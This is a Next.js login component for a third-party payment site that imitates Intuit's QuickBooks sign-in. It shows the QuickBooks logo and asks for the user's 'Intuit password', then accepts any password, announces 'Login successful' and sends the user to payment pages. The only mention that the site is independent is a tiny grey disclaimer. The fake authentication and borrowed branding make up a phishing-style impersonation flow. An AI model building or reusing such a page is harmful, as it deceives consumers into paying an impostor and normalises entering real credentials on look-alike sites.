'use client'

import useParamPaymentDetails from '@/app/hooks/useParamPaymentDetails';
import { useSteps } from '@/app/hooks/useSteps';
import { useUserDetails } from '@/app/hooks/useUserDetails';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { useState } from 'react';
import toast from 'react-hot-toast';
import Loader from '@/components/loader';

// Login Page Component
const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
    const searchParams = useSearchParams()
    const planParam = searchParams.get('plan')
    const isPlan = planParam && ['foundation', 'growth', 'enterprise'].includes(planParam.toLowerCase())

    const [email, setEmail] = useState('');
    const [rememberMe, setRememberMe] = useState(true);
    const {setStep} = useSteps()
    
    const handleSignIn = () => {
        if (email) {
            setStep(1)
            onNext(email);
        }
    };

    return (
        <div className="mt-20 flex items-center justify-center p-4">
            <form onSubmit={handleSignIn} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                {/* Logo */}
                {/* Branding is unconditional on purpose: `isPlan` comes from useSearchParams(),
                    so branching the markup on it makes the server and client render different
                    trees and React throws a hydration mismatch. */}
                <div className="mb-5">
                    <img src="/quickbooks_logo.png" className="mx-auto" alt="Intuit QuickBooks" width={200} height={100} />
                </div>

                {/* Title */}
                <h2 className="text-xl font-semibold text-gray-800 text-center mb-8 font-normal">
                    {isPlan ? 'Sign in to Quality Business' : "Let's get you in to QuickBooks"}
                </h2>

                {/* Email Input */}
                <div className="mb-6">
                    <input
                        type="email"
                        placeholder="Email"
                        value={email}
                        required
                        onChange={(e) => setEmail(e.target.value)}
                        className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 border-[#2ca01c] focus:border-blue-500`}
                    />
                </div>

                {/* Remember Me Checkbox */}
                <div className="flex items-center mb-6">
                    <input
                        type="checkbox"
                        id="remember"
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                        className={`w-4 h-4 bg-gray-100 border-gray-300 rounded text-[#2ca01c] focus:ring-[#2ca01c]`}
                    />
                    <label htmlFor="remember" className="ml-3 text-gray-700">
                        Remember me
                    </label>
                </div>

                {/* Sign In Button */}
                <button
                    type='submit'  
                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 flex items-center justify-center bg-[#2ca01c] hover:bg-[#248a18]`}
                >
                    <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                    </svg>
                    Sign in
                </button>
                <p className='text-gray-400 text-xs mt-5 leading-4'>
                    {isPlan ? (
                        <>
                            By selecting Sign in for your Quality Business Account, you agree to our{' '}
                            <a 
                                href="https://www.qualitybusinesstech.us/terms" 
                                target="_blank" 
                                rel="noopener noreferrer"
                                className='text-blue-600 hover:text-blue-800 font-semibold'
                            >
                                Terms
                            </a>. Our{' '}
                            <a 
                                href="https://www.qualitybusinesstech.us/privacy-policy" 
                                target="_blank" 
                                rel="noopener noreferrer"
                                className='text-blue-600 hover:text-blue-800 font-semibold'
                            >
                                Privacy Policy
                            </a>{' '}
                            applies to your personal data.
                        </>
                    ) : (
                        <>
                            {/* Our own /terms and /privacy, not intuit.com. These links used to
                                point at Intuit's legal pages, which implied Intuit's terms govern a
                                purchase from us — the opposite of the disclaimer directly below. */}
                            By selecting Sign in, you agree to our{' '}
                            <Link href="/terms" target="_blank" className='text-blue-600 hover:text-blue-800'>
                                Terms
                            </Link>. Our{' '}
                            <Link className='text-blue-600 hover:text-blue-800' href="/privacy" target="_blank">
                                Privacy Policy
                            </Link>{' '}
                            applies to your personal data.
                        </>
                    )}
                </p>

                {/* Independent service disclaimer — same block as quickbooks-enterprises.com,
                    with this site's own domain. */}
                <div className="mt-8 pt-4 border-t border-gray-100">
                    <p className="text-[10px] leading-snug text-gray-400 text-center">
                        <strong>Disclaimer:</strong> quickbooks-solutions.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
                    </p>
                </div>
            </form>
        </div>
    );
};

// Password Page Component
const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) => {
    const searchParams = useSearchParams()
    // Payment links arrive under either key: useParamPaymentDetails and /invoice/[id] send
    // `token`, components/stepper.tsx sends `payment`. Reading only `payment` meant every
    // `?token=` link failed the guard below and showed a bogus "Internal Server Error".
    const paymentKey = searchParams.get('token') ? 'token' : 'payment'
    const paymentID = searchParams.get('token') || searchParams.get('payment')
    const planParam = searchParams.get('plan')
    const isPlan = planParam && ['foundation', 'growth', 'enterprise'].includes(planParam.toLowerCase())

    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const router = useRouter()
    const {setStep} = useSteps()

    useParamPaymentDetails({noLinkRedirection: true, enableToast: false, noLoginRedir: true})

    const handleContinue = (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        if (!paymentID && !isPlan) {
            toast.error('This payment link is invalid or has expired.')
            return
        }
        if (password) {
            setStep(2)
            toast.success('Login successful')
            if (isPlan) {
                router.push('/checkout?plan=' + planParam)
            } else {
                // Payment links go to /order-summary, which dispatches on the gateway the
                // admin picked (Shopify, Authorize.net, Online Payment, …). /checkout is the
                // older page whose "Pay Now" is hardwired to ePay, so a Shopify link landing
                // there failed with "Payment gateway not configured". ?plan= links stay on
                // /checkout — only its order summary knows how to price a plan.
                router.push(`/order-summary?${paymentKey}=${paymentID}`)
            }
        }
    };
    
    return (
        <div className="mt-20 flex items-center justify-center p-4">
            <form onSubmit={handleContinue} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                {/* Logo */}
                {/* Branding is unconditional on purpose: `isPlan` comes from useSearchParams(),
                    so branching the markup on it makes the server and client render different
                    trees and React throws a hydration mismatch. */}
                <div className="mb-5">
                    <img src="/quickbooks_logo.png" className="mx-auto" alt="Intuit QuickBooks" width={200} height={100} />
                </div>

                {/* Title */}
                <h2 className="text-xl font-semibold text-gray-800 text-center mb-2 font-normal">
                    {isPlan ? 'Enter your password' : 'Enter your Intuit password'}
                </h2>

                {/* Email Display */}
                <div className="text-center mb-2">
                    <span className="text-gray-700">{email}</span>
                </div>

                {/* Use Different Account Link */}
                <div className="text-center mb-6">
                    <button
                        onClick={onBack}
                        type="button"
                        className={`text-sm underline ${
                            isPlan ? 'text-gray-600 hover:text-black' : 'text-blue-600 hover:text-blue-800'
                        }`}
                    >
                        Use a different account
                    </button>
                </div>

                {/* Password Input */}
                <div className="mb-6">
                    <label className="block text-gray-700 text-sm mb-2">Password</label>
                    <div className="relative">
                        <input
                            required
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 pr-12 border-[#2ca01c] focus:border-blue-500`}
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-600 hover:text-gray-800"
                        >
                            {showPassword ? (
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                </svg>
                            ) : (
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                                </svg>
                            )}
                        </button>
                    </div>
                </div>

                {/* Continue Button */}
                <button
                    type='submit'
                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-6 bg-[#2ca01c] hover:bg-[#248a18]`}
                >
                    Continue
                </button>
            </form>
        </div>
    );
};

// Main App Component
export default function IntuitLogin() {
    const searchParams = useSearchParams()
    // Either key — see the note in PasswordPage.
    const paymentID = searchParams.get('token') || searchParams.get('payment')
    const planParam = searchParams.get('plan')
    const isPlan = planParam && ['foundation', 'growth', 'enterprise'].includes(planParam.toLowerCase())

    const {paymentObj} = useParamPaymentDetails({
        enableToast: false, 
        noLinkRedirection: (paymentID || isPlan) ? false : true, 
        noLoginRedir: isPlan ? true : false
    })
    const [currentPage, setCurrentPage] = useState('login');
    const {setStep, step} = useSteps()
    const {setUserDetails, userDetails} = useUserDetails()
    
    if (step === 2) {
        return <Loader />;
    }
    
    const handleNext = (email: string) => {
        setUserDetails({email})
        setCurrentPage('password');
    };

    const handleBack = () => {
        setStep(0)
        setCurrentPage('login');
        setUserDetails({email: ''})
    };
    
    return (
        <>
            {currentPage === 'login' && (
                <LoginPage onNext={handleNext} />
            )}
            {currentPage === 'password' && (
                <PasswordPage email={userDetails.email} onBack={handleBack} />
            )}
        </>
    );
}